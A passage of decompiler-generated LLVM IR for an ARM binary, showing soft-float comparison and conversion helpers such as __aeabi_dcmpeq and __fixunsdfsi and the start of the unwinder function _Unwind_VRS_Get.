  %v3_21af4.in = phi i32 [ %v9_21ae4, %dec_label_pc_21adc ], [ %v14_21ae8, %bb106 ]
  %v2_21af4 = phi i1 [ %v11_21ae4, %dec_label_pc_21adc ], [ %v16_21ae8, %bb106 ]
  %v1_21af4 = phi i1 [ %v12_21ae4, %dec_label_pc_21adc ], [ %v17_21ae8, %bb106 ]
  %v3_21af4 = icmp slt i32 %v3_21af4.in, 0
  %v3_21aec = xor i1 %v3_21af4, %v2_21af4
  %v4_21aec = or i1 %v1_21af4, %v3_21aec
  br i1 %v4_21aec, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_21aec84 = mul i32 %v6_21ae4, 1048576
  %v10_21aec85 = or i32 %v9_21aec84, %v5_21ae0
  store i32 %v10_21aec85, i32* %r1.global-to-local, align 4
  store i32 %v3_21974, i32* %r4.global-to-local, align 4
  store i32 %v6_21974, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_21af4 = phi i32 [ %v12_21974, %bb108 ], [ %v1_21adc, %bb107 ]
  %v6_21af4 = xor i1 %v4_21aec, true
  call void @__pseudo_cond_branch(i1 %v6_21af4, i32 %v0_21af4)
  %v0_21af8 = load i32, i32* %r1.global-to-local, align 4
  %v1_21af8 = or i32 %v0_21af8, 1048576
  store i32 %v1_21af8, i32* @r1, align 4
  %v0_21b00 = load i32, i32* %r4.global-to-local, align 4
  %v1_21b00 = add i32 %v0_21b00, -1
  store i32 %v1_21b00, i32* @r4, align 4
  %v3_21b00 = sub i32 0, %v0_21b00
  %v4_21b00 = and i32 %v0_21b00, %v3_21b00
  %v5_21b00 = icmp slt i32 %v4_21b00, 0
  store i1 %v5_21b00, i1* @cpsr_v, align 1
  %v6_21b00 = icmp slt i32 %v1_21b00, 0
  store i1 %v6_21b00, i1* @cpsr_n, align 1
  %v7_21b00 = icmp eq i32 %v0_21b00, 1
  store i1 %v7_21b00, i1* @cpsr_z, align 1
  %v0_21b04 = call i32 @function_217d0()
  store i32 %v0_21b04, i32* @r0, align 4
  %v0_21b0c = call i32 @function_217d0()
  store i32 %v0_21b0c, i32* @r0, align 4
  %v0_21b10.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_21b14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_21b10

dec_label_pc_21b10:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_21b10.pre-phi = phi i32 [ %v5_21984, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_21984, %bb91 ], [ %v5_21984, %.thread ]
  %v0_21b14 = phi i32 [ %v5_21980, %.thread1 ], [ %v5_21980, %.thread2 ], [ %v5_21980, %bb91 ], [ %v0_21b14.pre, %.thread ]
  %v2_21b18 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_21b10.pre, %.thread ]
  %v5_21b10 = and i32 %v2_21b18, %v4_21b10.pre-phi
  store i32 %v5_21b10, i32* @r5, align 4
  %v4_21b14 = icmp eq i32 %v2_21b18, %v0_21b14
  br i1 %v4_21b14, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_21b10
  %v5_21b18 = icmp eq i32 %v5_21b10, %v2_21b18
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_21b10, %bb109
  %v0_21b1c = phi i1 [ false, %dec_label_pc_21b10 ], [ %v5_21b18, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_21b1c, i32 ptrtoint (i32* @global_var_21964.1903 to i32))
  %v0_21b20 = load i32, i32* @r4, align 4
  %v1_21b20 = load i32, i32* %ip.global-to-local, align 4
  %v4_21b20 = icmp eq i32 %v1_21b20, %v0_21b20
  br i1 %v4_21b20, label %dec_label_pc_21b28, label %dec_label_pc_21b44

dec_label_pc_21b28:                               ; preds = %bb110
  %v0_21b28 = load i32, i32* @r0, align 4
  %v1_21b28 = load i32, i32* @r1, align 4
  %v4_21b28 = mul i32 %v1_21b28, 4096
  %v5_21b28 = or i32 %v4_21b28, %v0_21b28
  store i32 %v5_21b28, i32* %r4.global-to-local, align 4
  %v1_21b2c = icmp ne i32 %v5_21b28, 0
  call void @__pseudo_cond_branch(i1 %v1_21b2c, i32 ptrtoint (i32* @global_var_21964.1903 to i32))
  %v0_21b30 = load i32, i32* @r5, align 4
  %v1_21b30 = load i32, i32* %ip.global-to-local, align 4
  %v1_21b34 = icmp ne i32 %v1_21b30, %v0_21b30
  call void @__pseudo_cond_branch(i1 %v1_21b34, i32 ptrtoint (i32* @global_var_21948.1904 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_21b40 = call i32 @function_21964(i32 %arg3, i32 %arg4)
  store i32 %v2_21b40, i32* @r0, align 4
  %v1_21b44.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_21b44

dec_label_pc_21b44:                               ; preds = %bb110, %dec_label_pc_21b28
  %v1_21b44 = phi i32 [ %v1_21b20, %bb110 ], [ %v1_21b44.pre, %dec_label_pc_21b28 ]
  %v0_21b44 = load i32, i32* @r5, align 4
  %v4_21b44 = icmp eq i32 %v0_21b44, %v1_21b44
  br i1 %v4_21b44, label %dec_label_pc_21b4c, label %dec_label_pc_21b44.dec_label_pc_21b60_crit_edge

dec_label_pc_21b44.dec_label_pc_21b60_crit_edge:  ; preds = %dec_label_pc_21b44
  %v0_21b60.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_21b60

dec_label_pc_21b4c:                               ; preds = %dec_label_pc_21b44
  %v4_21b4c = mul i32 %arg4, 4096
  %v5_21b4c = or i32 %v4_21b4c, %arg3
  store i32 %v5_21b4c, i32* %r5.global-to-local, align 4
  %v7_21b4c = icmp eq i32 %v5_21b4c, 0
  call void @__pseudo_cond_branch(i1 %v7_21b4c, i32 ptrtoint (i32* @global_var_218f8.1905 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_21b5c = call i32 @function_21964(i32 %arg3, i32 %arg4)
  store i32 %v2_21b5c, i32* @r0, align 4
  br label %dec_label_pc_21b60

dec_label_pc_21b60:                               ; preds = %dec_label_pc_21b44.dec_label_pc_21b60_crit_edge, %dec_label_pc_21b4c
  %v0_21b60 = phi i32 [ %v0_21b60.pre, %dec_label_pc_21b44.dec_label_pc_21b60_crit_edge ], [ %v2_21b5c, %dec_label_pc_21b4c ]
  %v1_21b60 = load i32, i32* @r1, align 4
  %v3_21b60 = mul i32 %v1_21b60, 2
  %v4_21b60 = or i32 %v3_21b60, %v0_21b60
  store i32 %v4_21b60, i32* %r6.global-to-local, align 4
  %v6_21b60 = icmp eq i32 %v4_21b60, 0
  br i1 %v6_21b60, label %dec_label_pc_21b60._crit_edge, label %bb111

dec_label_pc_21b60._crit_edge:                    ; preds = %dec_label_pc_21b60
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_21b60
  %v4_21b64 = mul i32 %arg4, 2
  %v5_21b64 = or i32 %v4_21b64, %arg3
  store i32 %v5_21b64, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_21b64, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_21b60._crit_edge, %bb111
  %v4_21b74.pre-phi = phi i32 [ %.pre80, %dec_label_pc_21b60._crit_edge ], [ %v5_21b64, %bb111 ]
  %v0_21b68 = phi i1 [ false, %dec_label_pc_21b60._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_21b68, i32 ptrtoint (i32* @global_var_21890.1906 to i32))
  %v0_21b6c = load i32, i32* @r0, align 4
  %v1_21b6c = load i32, i32* @r1, align 4
  %v3_21b6c = mul i32 %v1_21b6c, 2
  %v4_21b6c = or i32 %v3_21b6c, %v0_21b6c
  store i32 %v4_21b6c, i32* %r4.global-to-local, align 4
  %v1_21b70 = icmp ne i32 %v4_21b6c, 0
  call void @__pseudo_cond_branch(i1 %v1_21b70, i32 ptrtoint (i32* @global_var_21948.1904 to i32))
  store i32 %v4_21b74.pre-phi, i32* %r5.global-to-local, align 4
  %v1_21b78 = icmp ne i32 %v4_21b74.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_21b78, i32 ptrtoint (i32* @global_var_218f8.1905 to i32))
  %v0_21b7c = load i32, i32* @r0, align 4
  %v1_21b7c = load i32, i32* @r1, align 4
  %v2_21b7c = call i32 @function_21964(i32 %v0_21b7c, i32 %v1_21b7c)
  store i32 %v2_21b7c, i32* %r0.global-to-local, align 4
  ret i32 %v2_21b7c

; uselistorder directives
  uselistorder i32 %v5_21b64, { 1, 0, 2 }
  uselistorder i32 %v1_21b20, { 1, 0 }
  uselistorder i32 %v1_21b00, { 1, 0 }
  uselistorder i32 %v0_21b00, { 3, 1, 0, 2 }
  uselistorder i32 %v10_21ae8, { 2, 0, 1 }
  uselistorder i32 %v6_21ae4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_21adc, { 1, 0 }
  uselistorder i32 %v2_21ac4, { 1, 0, 2 }
  uselistorder i32 %v1_21ac4, { 1, 0, 2 }
  uselistorder i32 %v1_21ac0, { 1, 0, 2 }
  uselistorder i32 %v0_21ac0, { 1, 0, 2 }
  uselistorder i1 %v7_21ab4, { 1, 0 }
  uselistorder i32 %v2_21a98, { 1, 0 }
  uselistorder i32 %v3_21a84, { 2, 1, 0 }
  uselistorder i32 %v3_21a78, { 0, 2, 1 }
  uselistorder i32 %v5_21a74, { 2, 0, 1 }
  uselistorder i32 %v6_21a64, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_21a50, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_21a4c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_21a58, { 0, 2, 1 }
  uselistorder i32 %v1_21a64, { 1, 0 }
  uselistorder i32 %v6_21a48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_21a34, { 1, 2, 0, 3 }
  uselistorder i32 %v3_21a30, { 0, 2, 1 }
  uselistorder i32 %v0_21a3c, { 0, 2, 1 }
  uselistorder i32 %v1_21a48, { 1, 0 }
  uselistorder i32 %v6_21a2c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_21a18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_21a20, { 0, 2, 1 }
  uselistorder i32 %v1_21a2c, { 1, 0 }
  uselistorder i32 %v3_21a10, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_21a04, { 1, 2, 0 }
  uselistorder i32 %v3_21a8413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_21a8017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_21a04, { 0, 3, 2, 1 }
  uselistorder i32 %v1_21a10, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_21aac.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_219f0, { 1, 0 }
  uselistorder i32 %v0_219f4, { 1, 0 }
  uselistorder i32 %v3_219e0, { 1, 0 }
  uselistorder i1 %v1_219d4, { 1, 0 }
  uselistorder i32 %v3_219c4, { 2, 3, 1, 0 }
  uselistorder i32 %v5_219c0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_219b8, { 2, 1, 0 }
  uselistorder i32 %v5_219b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_21994, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_21984, { 2, 3, 1, 0 }
  uselistorder i32 %v5_21984, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_21980, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_21980, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_21974, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 9, 6, 7, 8, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_21964, { 2, 1, 0 }
  uselistorder i32 ()* @function_217d0, { 1, 0 }
  uselistorder i32 1024, { 4, 0, 26, 23, 24, 25, 1, 2, 27, 5, 28, 3, 7, 6, 8, 9, 20, 10, 11, 21, 12, 13, 22, 14, 18, 17, 16, 15, 19 }
  uselistorder i32 536870912, { 2, 3, 0, 5, 4, 1 }
  uselistorder i32 33, { 5, 6, 7, 3, 8, 9, 10, 0, 2, 1, 4 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_21b60, { 1, 0 }
  uselistorder label %dec_label_pc_21b44, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_21b10, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_21a00, { 1, 0 }
  uselistorder label %dec_label_pc_219e8, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_21b84 = call i32 @function_21b94()
  ret i32 %v0_21b84
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_21b8c = call i32 @function_21b94()
  ret i32 %v0_21b8c

; uselistorder directives
  uselistorder i32 ()* @function_21b94, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_21b90 = load i32, i32* @r0, align 4
  ret i32 %v0_21b90
}

define i32 @function_21b94() local_unnamed_addr {
dec_label_pc_21b94:
  %v0_21b94 = load i32, i32* @ip, align 4
  %v0_21b98 = load i32, i32* @r1, align 4
  %v2_21b98 = mul i32 %v0_21b98, 2
  %v2_21b98.off = add i32 %v2_21b98, 4194303
  %tmp = icmp ult i32 %v2_21b98.off, 2097152
  %v0_21ba0 = load i32, i32* @r3, align 4
  %v2_21ba0 = mul i32 %v0_21ba0, 2
  br i1 %tmp, label %dec_label_pc_21bf0, label %bb

bb:                                               ; preds = %dec_label_pc_21b94
  %v2_21ba0.off = add i32 %v2_21ba0, 4194303
  %tmp21 = icmp ult i32 %v2_21ba0.off, 2097152
  br i1 %tmp21, label %dec_label_pc_21be4, label %dec_label_pc_21bac

dec_label_pc_21bac:                               ; preds = %dec_label_pc_21bf8, %dec_label_pc_21c04, %bb
  %v0_21bac = load i32, i32* @r0, align 4
  %v4_21bac = or i32 %v0_21bac, %v2_21b98
  %v6_21bac = icmp eq i32 %v4_21bac, 0
  br i1 %v6_21bac, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_21bac
  %v1_21bb0 = load i32, i32* @r2, align 4
  %v5_21bb0 = or i32 %v1_21bb0, %v2_21ba0
  %v7_21bb0 = icmp eq i32 %v5_21bb0, 0
  br i1 %v7_21bb0, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_21bac, %bb10
  %v5_21bb4 = icmp eq i32 %v0_21ba0, %v0_21b98
  br i1 %v5_21bb4, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_21bb8.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_21bb8 = phi i32 [ %v2_21bb8.pre, %.thread..thread1_crit_edge ], [ %v1_21bb0, %bb10 ]
  %v5_21bb8 = icmp eq i32 %v2_21bb8, %v0_21bac
  br i1 %v5_21bb8, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_21bc0 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_21bc0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_21bc0, i32 %v0_21bc0)
  %v0_21bc4 = load i32, i32* @r0, align 4
  %v0_21bc8 = load i32, i32* @r1, align 4
  %v1_21bc8 = load i32, i32* @r3, align 4
  %v2_21bc8 = xor i32 %v1_21bc8, %v0_21bc8
  %v3_21bc8 = icmp slt i32 %v2_21bc8, 0
  br i1 %v3_21bc8, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_21bcc = icmp eq i32 %v0_21bc8, %v1_21bc8
  br i1 %v10_21bcc, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_21bd0 = load i32, i32* @r2, align 4
  %v4_21bd0 = icmp ult i32 %v0_21bc4, %v2_21bd0
  br i1 %v4_21bd0, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_21bcc = icmp ult i32 %v0_21bc8, %v1_21bc8
  br i1 %v4_21bcc, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_21bc8, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_21bd4 = and i32 %v1_21bc8, 1073741824
  %v3_21bd4 = icmp eq i32 %v2_21bd4, 0
  %v4_21bd4 = ashr i32 %v1_21bc8, 31
  br i1 %v3_21bd4, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_21bd8.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_21bd4, %bb15 ]
  %v5_21bd8 = sub nsw i32 -1, %v4_21bd8.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_21bdc = phi i32 [ %v4_21bd4, %bb15 ], [ %v5_21bd8, %.thread3 ]
  %v1_21bdc = or i32 %v0_21bdc, 1
  ret i32 %v1_21bdc

dec_label_pc_21be4:                               ; preds = %bb
  br label %dec_label_pc_21bf8

dec_label_pc_21bf0:                               ; preds = %dec_label_pc_21b94
  %v0_21bf0 = load i32, i32* @r0, align 4
  %v4_21bf0 = mul i32 %v0_21b98, 4096
  %v5_21bf0 = or i32 %v0_21bf0, %v4_21bf0
  %v7_21bf0 = icmp eq i32 %v5_21bf0, 0
  br i1 %v7_21bf0, label %dec_label_pc_21bf0.dec_label_pc_21bf8_crit_edge, label %dec_label_pc_21c0c

dec_label_pc_21bf0.dec_label_pc_21bf8_crit_edge:  ; preds = %dec_label_pc_21bf0
  %v2_21ba0.off20 = add i32 %v2_21ba0, 4194303
  %tmp22 = icmp ult i32 %v2_21ba0.off20, 2097152
  br label %dec_label_pc_21bf8

dec_label_pc_21bf8:                               ; preds = %dec_label_pc_21bf0.dec_label_pc_21bf8_crit_edge, %dec_label_pc_21be4
  %v3_21bfc.pre-phi = phi i1 [ %tmp22, %dec_label_pc_21bf0.dec_label_pc_21bf8_crit_edge ], [ true, %dec_label_pc_21be4 ]
  br i1 %v3_21bfc.pre-phi, label %dec_label_pc_21c04, label %dec_label_pc_21bac

dec_label_pc_21c04:                               ; preds = %dec_label_pc_21bf8
  %v0_21c04 = load i32, i32* @r2, align 4
  %v4_21c04 = mul i32 %v0_21ba0, 4096
  %v5_21c04 = or i32 %v0_21c04, %v4_21c04
  %v7_21c04 = icmp eq i32 %v5_21c04, 0
  br i1 %v7_21c04, label %dec_label_pc_21bac, label %dec_label_pc_21c0c

dec_label_pc_21c0c:                               ; preds = %dec_label_pc_21bf0, %dec_label_pc_21c04
  ret i32 %v0_21b94

; uselistorder directives
  uselistorder i32 %v4_21bd4, { 1, 0 }
  uselistorder i32 %v1_21bc8, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_21bc8, { 2, 1, 0 }
  uselistorder i32 %v1_21bb0, { 1, 0 }
  uselistorder i32 %v2_21ba0, { 0, 2, 1 }
  uselistorder i32 %v0_21ba0, { 1, 0, 2 }
  uselistorder i32 %v2_21b98, { 1, 0 }
  uselistorder i32 %v0_21b98, { 1, 0, 2 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 12, 13, 14, 7, 1, 15, 0, 16, 17, 18, 19, 8, 9 }
  uselistorder label %dec_label_pc_21c0c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_21bac, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_21c14 = load i32, i32* @r0, align 4
  %v0_21c18 = load i32, i32* @r2, align 4
  store i32 %v0_21c18, i32* @r0, align 4
  store i32 %v0_21c14, i32* @r2, align 4
  %v0_21c2c = call i32 @__aeabi_cdcmple()
  ret i32 %v0_21c2c
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_21c30 = load i32, i32* @r0, align 4
  %v1_21c34 = sext i32 %v3_21c30 to i64
  %v2_21c34 = bitcast i64 %v1_21c34 to double
  %v3_21c34 = load i32, i32* @r2, align 4
  %v4_21c34 = sext i32 %v3_21c34 to i64
  %v5_21c34 = bitcast i64 %v4_21c34 to double
  %v7_21c34 = fcmp oeq double %v2_21c34, %v5_21c34
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_21c34 = fcmp ule double %v2_21c34, %v5_21c34
  %not.v7_21c34 = xor i1 %v7_21c34, true
  %v1_21c38 = and i1 %not.v6_21c34, %not.v7_21c34
  store i1 %v7_21c34, i1* @cpsr_z, align 1
  br i1 %v1_21c38, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_21c34, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_21c30

; uselistorder directives
  uselistorder i1 %v7_21c34, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_21c4c = call i32 @__aeabi_cdcmple()
  %v0_21c50 = load i1, i1* @cpsr_z, align 1
  %.v0_21c4c. = zext i1 %v0_21c50 to i32
  ret i32 %.v0_21c4c.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_21c64 = call i32 @__aeabi_cdcmple()
  %v0_21c68 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_21c68 to i32
  %.v0_21c64. = xor i32 %tmp2, 1
  ret i32 %.v0_21c64.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_21c7c = call i32 @__aeabi_cdcmple()
  %v0_21c80 = load i1, i1* @cpsr_z, align 1
  %v1_21c80 = load i1, i1* @cpsr_c, align 1
  %v2_21c80 = xor i1 %v1_21c80, true
  %v3_21c80 = or i1 %v0_21c80, %v2_21c80
  %.v0_21c7c = select i1 %v3_21c80, i32 1, i32 %v0_21c7c
  %v2_21c84 = xor i1 %v0_21c80, true
  %v3_21c84 = and i1 %v1_21c80, %v2_21c84
  %..v0_21c7c = select i1 %v3_21c84, i32 0, i32 %.v0_21c7c
  ret i32 %..v0_21c7c

; uselistorder directives
  uselistorder i1 %v1_21c80, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 0, 2, 1, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_21c90 = load i32, i32* @lr, align 4
  store i32 %v0_21c90, i32* %stack_var_-8, align 4
  %v0_21c94 = call i32 @__aeabi_cdrcmple()
  %v0_21c98 = load i1, i1* @cpsr_z, align 1
  %v1_21c98 = load i1, i1* @cpsr_c, align 1
  %v2_21c98 = xor i1 %v1_21c98, true
  %v3_21c98 = or i1 %v0_21c98, %v2_21c98
  %.v0_21c94 = select i1 %v3_21c98, i32 1, i32 %v0_21c94
  %v2_21c9c = xor i1 %v0_21c98, true
  %v3_21c9c = and i1 %v1_21c98, %v2_21c9c
  %..v0_21c94 = select i1 %v3_21c9c, i32 0, i32 %.v0_21c94
  %v2_21ca0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_21ca0, i32* @lr, align 4
  ret i32 %..v0_21c94

; uselistorder directives
  uselistorder i1 %v1_21c98, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_21cac = call i32 @__aeabi_cdrcmple()
  %v0_21cb0 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_21cb0 to i32
  %.v0_21cac. = xor i32 %tmp2, 1
  ret i32 %.v0_21cac.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 0, 6, 1, 7, 8, 9, 2, 3, 4, 5 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_21cc0 = icmp slt i32 %arg2, 0
  %v2_21cc0 = mul i32 %arg2, 2
  br i1 %v1_21cc0, label %dec_label_pc_21cf4, label %dec_label_pc_21cc8

dec_label_pc_21cc8:                               ; preds = %entry
  %v1_21cc8 = add i32 %v2_21cc0, 2097152
  %v2_21cc8 = icmp ugt i32 %v2_21cc0, -2097153
  br i1 %v2_21cc8, label %dec_label_pc_21cfc, label %dec_label_pc_21cd0

dec_label_pc_21cd0:                               ; preds = %dec_label_pc_21cc8
  %v6_21cc8 = icmp slt i32 %v1_21cc8, 0
  br i1 %v6_21cc8, label %dec_label_pc_21cd4, label %dec_label_pc_21cf4

dec_label_pc_21cd4:                               ; preds = %dec_label_pc_21cd0
  %v4_21cd8 = sdiv i32 %v1_21cc8, 2097152
  %v5_21cd8 = sub nsw i32 -993, %v4_21cd8
  %v11_21cd8 = icmp slt i32 %v5_21cd8, 0
  br i1 %v11_21cd8, label %dec_label_pc_21d04, label %dec_label_pc_21ce0

dec_label_pc_21ce0:                               ; preds = %dec_label_pc_21cd4
  %v3_21ce0 = mul i32 %arg2, 2048
  %v4_21ce8 = udiv i32 %arg1, 2097152
  %v1_21ce4 = or i32 %v4_21ce8, %v3_21ce0
  %v5_21ce8 = or i32 %v1_21ce4, -2147483648
  %v6_21cec = lshr i32 %v5_21ce8, %v5_21cd8
  ret i32 %v6_21cec

dec_label_pc_21cf4:                               ; preds = %dec_label_pc_21cd0, %entry
  ret i32 0

dec_label_pc_21cfc:                               ; preds = %dec_label_pc_21cc8
  %v4_21cfc = mul i32 %arg2, 4096
  %v5_21cfc = or i32 %v4_21cfc, %arg1
  %v7_21cfc = icmp eq i32 %v5_21cfc, 0
  br i1 %v7_21cfc, label %dec_label_pc_21d04, label %dec_label_pc_21d0c

dec_label_pc_21d04:                               ; preds = %dec_label_pc_21cfc, %dec_label_pc_21cd4
  ret i32 -1

dec_label_pc_21d0c:                               ; preds = %dec_label_pc_21cfc
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_21d14 = icmp eq i32 %regclass, 0
  br i1 %v2_21d14, label %dec_label_pc_21d1c, label %dec_label_pc_21d4c

dec_label_pc_21d1c:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_21d1c
  %v6_21d20 = icmp eq i32 %representation, 0
  br i1 %v6_21d20, label %dec_label_pc_21d30, label %bb8

.thread3:                                         ; preds = %dec_label_pc_21d1c
  br label %dec_label_pc_21d58

bb8:                                              ; preds = %bb
  br label %dec_label_pc_21d58

dec_label_pc_21d30:                               ; preds = %bb
  %v3_21d30 = mul i32 %regno, 4
  %v2_21d34 = add i32 %v3_21d30, %context
  %v1_21d38 = add i32 %v2_21d34, 4
